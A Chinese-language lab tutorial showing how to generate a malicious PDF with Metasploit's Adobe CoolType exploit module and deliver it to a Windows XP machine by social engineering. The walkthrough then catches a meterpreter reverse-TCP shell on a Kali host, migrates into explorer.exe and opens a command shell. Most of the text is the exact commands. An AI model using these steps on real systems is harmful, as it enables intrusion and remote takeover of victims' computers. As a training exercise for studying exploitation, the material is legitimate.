
# 0X00 攻击原理和过程
一 、生成包含payload代码的ADOBE pdf文件<br />二、将其通过社工方法复制到XP<br />三、kali启动侦听<br />四、当xp下该文件运行，形成一个反弹连接到kali


# 0X01 实例

## 环境准备
winxp（192.168.1.130）目标机<br />kali（192.168.1.149）攻击机


## 步骤一
打开msfconsole
```
root@kali222:~# service postgresql restart
root@kali222:~# msfdb init
root@kali222:~# msfconsole
```
<br />![](https://img-blog.csdnimg.cn/20200415144642933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=T4FYG&originHeight=417&originWidth=723&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 步骤二
打开ADOBE 利用模块，去生成包含payload的PDF文档
```
msf5 > use exploit/windows/fileformat/adobe_cooltype_sing    ----打开ADOBE 利用模块，去生成包含payload的PDF文档
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > set payload
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > set lhost  192.168.1.149   --设置kali的ip
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > set lport 4444  --设置kali的port
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > show options
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > exploit
```
<br />![](https://img-blog.csdnimg.cn/20200415144957186.png#crop=0&crop=0&crop=1&crop=1&id=vJ5Nv&originHeight=108&originWidth=728&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 步骤三
```
msf.pdf stored at /root/.msf4/local/msf.pdf               ------到此生成包含payload代码的pdf文件，将该文件复制到XP
```
<br />![](https://img-blog.csdnimg.cn/20200415145212296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=EVrZS&originHeight=211&originWidth=406&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 步骤四
```
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > back
msf5 >
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost  192.168.1.149
msf5 exploit(multi/handler) > show options
```
<br />![](https://img-blog.csdnimg.cn/20200415145354481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=eJr2q&originHeight=429&originWidth=721&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 步骤五
KALI上启动侦听
```
msf5 exploit(multi/handler) > exploit               ---KALI上启动侦听，当WIN7或者XP上该文件运行时候，会形成一个反弹连接到KALI
```
<br />![](https://img-blog.csdnimg.cn/2020041514561748.png#crop=0&crop=0&crop=1&crop=1&id=IuWQP&originHeight=172&originWidth=737&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 步骤六
```
获得控制权
meterpreter > ps
meterpreter > migrate  1476     --------迁移到explorer.exe 进程，explorer.exe是Windows程序管理器或者文件资源管理器，1476为explorer.exe 进程对应的进程号
```
<br />![](https://img-blog.csdnimg.cn/20200415145912874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=zNVYQ&originHeight=254&originWidth=559&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 步骤七
用shell连接
```
meterpreter > shell
```
<br />![](https://img-blog.csdnimg.cn/2020041515000268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=xEZ3F&originHeight=220&originWidth=443&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
